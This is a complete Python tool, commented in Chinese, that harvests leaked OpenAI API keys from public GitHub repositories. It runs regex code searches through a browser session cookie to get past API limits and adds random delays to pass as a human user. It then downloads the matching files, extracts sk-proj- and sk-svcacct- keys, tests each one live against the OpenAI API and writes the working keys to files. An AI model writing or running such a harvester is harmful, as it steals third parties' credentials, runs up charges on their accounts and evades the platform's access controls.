#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
专门扫描OpenAI API密钥的并发扫描器
支持sk-proj-和sk-svcacct-两种格式
使用GitHub Session进行正则搜索，突破API限制
支持多线程并发搜索以提高扫描速度
支持实时写入功能
"""

import os
import re
import time
import threading
import concurrent.futures
import random
from queue import Queue
import requests
from datetime import datetime
import openai

# 加载.env文件
try:
    from dotenv import load_dotenv
    load_dotenv()
    print("✅ 已加载.env文件")
except ImportError:
    print("⚠️ 未安装python-dotenv，将使用系统环境变量")

# --- 配置 ---
GITHUB_SESSION = os.getenv('GITHUB_SESSION')

# 并发配置
MAX_WORKERS = 10  # 最大并发线程数
API_DELAY = 1    # API请求间隔（秒）

# 存储结果的线程安全队列
live_keys_queue = Queue()
processed_keys = set()  # 防止重复处理相同密钥
lock = threading.Lock()
file_lock = threading.Lock()  # 文件写入锁

# 实时保存文件名（全局变量）
live_keys_filename = None
simple_keys_filename = None

# --- 辅助函数 ---

def get_headers():
    if not GITHUB_SESSION:
        raise ValueError("请在 .env 文件中设置 GITHUB_SESSION (浏览器 Cookie 中的 user_session 值)")
    return {
        "Cookie": f"user_session={GITHUB_SESSION}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }

def save_live_key_immediately(key_info):
    """实时保存存活密钥到文件"""
    global live_keys_filename, simple_keys_filename
    
    with file_lock:
        # 如果文件名还未初始化，创建文件名
        if live_keys_filename is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            live_keys_filename = f'openai_live_keys_{timestamp}.txt'
            simple_keys_filename = f'openai_keys_simple_{timestamp}.txt'
            
            # 创建详细文件的头部
            with open(live_keys_filename, 'w', encoding='utf-8') as f:
                f.write("=== OpenAI API密钥扫描结果 (实时更新) ===\n")
                f.write(f"支持格式: sk-proj-, sk-svcacct-\n")
                f.write(f"扫描开始时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 60 + "\n\n")
            
            # 创建简化文件的头部
            with open(simple_keys_filename, 'w', encoding='utf-8') as f:
                f.write("=== OpenAI API密钥列表 (实时更新) ===\n")
                f.write(f"扫描开始时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 40 + "\n\n")
        
        # 追加详细信息到详细文件
        with open(live_keys_filename, 'a', encoding='utf-8') as f:
            f.write(f"🔑 {key_info['type']}\n")
            f.write(f"   密钥: {key_info['key']}\n")
            f.write(f"   状态: {key_info['status']}\n")
            f.write(f"   仓库: {key_info['repo']}\n")
            f.write(f"   文件: {key_info['file_path']}\n")
            f.write(f"   链接: {key_info['url']}\n")
            f.write(f"   发现时间: {key_info['discovered_time']}\n")
            f.write(f"   处理线程: Worker-{key_info['worker_id']}\n")
            f.write("-" * 60 + "\n")
        
        # 追加密钥到简化文件
        with open(simple_keys_filename, 'a', encoding='utf-8') as f:
            f.write(f"{key_info['key']}\n")
        
        print(f"💾 已实时保存密钥到: {live_keys_filename}")

def check_openai_key(key):
    """验证OpenAI API密钥是否有效"""
    if not (key.startswith("sk-proj-") or key.startswith("sk-svcacct-")):
        # 也可以支持老的 sk- 但现在主要关注新的
        # 如果你想支持老的，可以去掉这个限制或者放宽
        pass 
    
    try:
        client = openai.OpenAI(api_key=key)
        # 发送一个低成本的请求
        client.models.list()
        return "🟢 存活 (Live)"
    except openai.AuthenticationError:
        return "🔴 无效/已吊销 (Invalid/Revoked)"
    except openai.RateLimitError:
        return "🟡 存活但超出配额 (Live but Rate-Limited)"
    except openai.PermissionDeniedError:
        return "🟡 存活但权限不足 (Live but Permission Denied)"
    except Exception as e:
        return f"⚪ 未知错误 (Unknown Error): {str(e)}"

def process_github_file(file_url, worker_id):
    """下载并处理文件内容，提取并验证API密钥"""
    try:
        # 构造 Raw URL
        if "github.com" in file_url and "/blob/" in file_url:
            raw_url = file_url.replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
        else:
            raw_url = file_url

        resp = requests.get(raw_url, timeout=15)
        if resp.status_code != 200:
            return

        file_content = resp.text
        
        # 使用正则表达式提取sk-proj-和sk-svcacct-密钥
        # 匹配 sk-proj- 后跟至少20个字符（通常更多）
        patterns = [
            r'(sk-proj-[A-Za-z0-9_-]{20,})',      # sk-proj-格式
            r'(sk-svcacct-[A-Za-z0-9_-]{20,})'    # sk-svcacct-格式
        ]
        
        potential_keys = []
        for pattern in patterns:
            potential_keys.extend(re.findall(pattern, file_content))
        
        # 提取仓库名方便记录
        repo_match = re.search(r'githubusercontent\.com/([^/]+/[^/]+)', raw_url)
        repo_name = repo_match.group(1) if repo_match else "unknown"
        file_path = raw_url.split(repo_name)[-1].lstrip('/') if repo_match else raw_url

        for key in potential_keys:
            # 过滤一些明显的假key
            if "example" in key or "placeholder" in key:
                continue

            with lock:
                if key in processed_keys:
                    continue
                processed_keys.add(key)
            
            # 验证密钥
            # print(f"[Worker-{worker_id}] 🔍 验证: {key[:20]}...")
            status = check_openai_key(key)
            
            if "🟢 存活" in status or ("🟡" in status and "Live" in status):
                print(f"[Worker-{worker_id}] 🔑 发现存活密钥: {key[:20]}... | 状态: {status}")
                
                key_info = {
                    'type': 'OpenAI API Key',
                    'key': key,
                    'status': status,
                    'url': file_url,
                    'repo': repo_name,
                    'file_path': file_path,
                    'discovered_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'worker_id': worker_id
                }
                
                # 实时保存到文件
                save_live_key_immediately(key_info)
                live_keys_queue.put(key_info)
            else:
                 # print(f"[Worker-{worker_id}] ❌ 无效: {key[:20]}...")
                 pass
            
            # 添加延迟以避免API速率限制
            time.sleep(API_DELAY)
            
    except Exception as e:
        pass # 忽略单个文件错误

def search_github(query, max_pages=5):
    """使用 GitHub Session 进行网页搜索"""
    links = set()
    print(f"📡 执行搜索查询: {query}")
    
    for page in range(1, max_pages + 1):
        try:
            url = "https://github.com/search"
            # type=code, s=indexed (最近索引), o=desc (新到旧)
            params = {'q': query, 'type': 'code', 'p': page, 'o': 'desc', 's': 'indexed'}
            
            resp = requests.get(url, headers=get_headers(), params=params, timeout=30)
            
            if resp.status_code == 429:
                print("   ⚠️ Search Rate Limited (429). Waiting 60s...")
                time.sleep(60)
                continue
            elif resp.status_code != 200:
                print(f"   ❌ Search Error {resp.status_code}")
                break
                
            # 提取链接
            # 典型的搜索结果链接: href="/username/repo/blob/hash/path/to/file"
            # 需要排除跳转链接等
            page_links = re.findall(r'href="(/[^\s"\'<>]+/blob/[^\s"\'<>]+?)(?:#L\d+)?"', resp.text)
            
            if not page_links:
                # print(f"   Page {page}: No links found (End of results or content hidden)")
                break
                
            new_links_count = 0
            for link in page_links:
                full = "https://github.com" + link.split('#')[0]
                if full not in links:
                    links.add(full)
                    new_links_count += 1
                
            print(f"   Page {page}: Found {len(page_links)} results, {new_links_count} new.")
            
            # 随机延迟，模拟人类行为
            time.sleep(random.uniform(2, 5))
            
        except Exception as e:
            print(f"   Search Exception: {e}")
            break
            
    return list(links)

def concurrent_search_and_validate():
    """并发搜索和验证"""
    print(f"🚀 开始并发搜索OpenAI API密钥 (并发数: {MAX_WORKERS})")
    print("支持格式: sk-proj-, sk-svcacct- (使用正则搜索)")
    print("=" * 60)
    
    # 定义搜索查询 - 使用正则搜索突破 API 限制
    # GitHub Search 支持 /regex/ 语法
    search_queries = [
        # sk-proj- 正则搜索
        '/sk-proj-[A-Za-z0-9_-]{48}/', # 粗略长度
        '/sk-proj-[A-Za-z0-9_-]{50,}/',
        
        # sk-svcacct- 正则搜索
        '/sk-svcacct-[A-Za-z0-9_-]{48}/',
        '/sk-svcacct-[A-Za-z0-9_-]{50,}/',
        
        # 组合关键词（作为备选，增加覆盖面）
        'sk-proj- language:python',
        'sk-proj- language:typescript',
        'sk-proj- filename:.env',
        'sk-svcacct- filename:.env'
    ]
    
    all_file_urls = set()
    
    # 1. 收集 URL
    for query in search_queries:
        urls = search_github(query, max_pages=5) # 每个查询翻5页
        all_file_urls.update(urls)
    
    file_list = list(all_file_urls)
    print(f"🗂️ 去重后共 {len(file_list)} 个唯一文件需要处理")
    
    # 2. 并发处理
    if file_list:
        print(f"⚡ 启动 {MAX_WORKERS} 个工作线程进行并发处理...")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            # 提交所有任务
            future_to_url = {executor.submit(process_github_file, url, (i % MAX_WORKERS) + 1): url 
                             for i, url in enumerate(file_list)}
            
            completed = 0
            total = len(file_list)
            for future in concurrent.futures.as_completed(future_to_url):
                completed += 1
                try:
                    future.result()
                    if completed % 10 == 0 or completed == total:
                        print(f"📊 进度: {completed}/{total} ({(completed/total)*100:.1f}%)")
                except Exception as e:
                    print(f"❌ Task Error: {e}")
    
    print("\n✅ 所有文件处理完成")

def main():
    """主函数"""
    if not GITHUB_SESSION:
        print("❌ 错误: 请在 .env 文件中设置 GITHUB_SESSION (浏览器 Cookie 中的 user_session 值)")
        print("   提示: 普通 GitHub Token 无法使用正则搜索，必须使用 Session Cookie。")
        return

    print("🔍 OpenAI API密钥并发扫描器 (Session版)")
    print("=" * 50)
    print(f"⚙️ 配置:")
    print(f"   - 最大并发线程数: {MAX_WORKERS}")
    print(f"   - 实时写入: 启用")
    print("=" * 50)
    
    start_time = time.time()
    
    try:
        concurrent_search_and_validate()
        
        end_time = time.time()
        print(f"\n🏁 扫描完成!")
        print(f"⏱️ 总耗时: {end_time - start_time:.2f}秒")
        print(f"🔧 处理的唯一密钥数: {len(processed_keys)}")
        print(f"✅ 发现存活密钥数: {live_keys_queue.qsize()}")
        
    except KeyboardInterrupt:
        print("\n🛑 用户中断扫描")
    except Exception as e:
        print(f"\n❌ 扫描过程中发生错误: {e}")

if __name__ == '__main__':
    main()
